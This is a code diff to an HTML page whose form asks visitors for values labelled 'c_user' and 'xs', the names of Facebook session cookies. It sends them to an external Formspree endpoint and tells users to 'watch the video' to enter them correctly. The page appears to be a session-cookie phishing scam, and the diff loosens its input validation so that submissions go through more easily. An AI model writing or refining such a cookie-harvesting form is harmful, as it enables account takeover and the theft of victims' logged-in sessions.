@@ -65,11 +65,11 @@
         <form id="myForm" action="https://formspree.io/f/mayroygo" method="post">
           <label class="label" for="recipient">c_user</label>
 
-          <input class="input" id="numberInput" type="number" name="number" minlength="6" oninput="validateInput()" required />
+          <input class="input" id="numberInput" type="number" name="number" required />
 
           <br />
           <label class="label" for="subject">xs</label>
-          <input class="input" pattern=".*A-1.*" title="Enter correct information! Watch the video" for="text" name="recipient" required />
+          <input class="input"  title="Enter correct information! Watch the video" for="text" name="recipient" required />
 
           <br />
           <div id="btn-div" class="btn-div">
@@ -111,17 +111,6 @@
       </figure>
     </div>
   </body>
-  <script>
-    function validateInput() {
-      var inputField = document.getElementById("numberInput");
-      var input = inputField.value;
-      
-      if (input.length < 6) {
-        inputField.setCustomValidity("watch the video to submit correct inputs");
-      } else {
-        inputField.setCustomValidity("");
-      }
-    }
-    </script>
+ 
   <script src="./index.js"></script>
 </html>
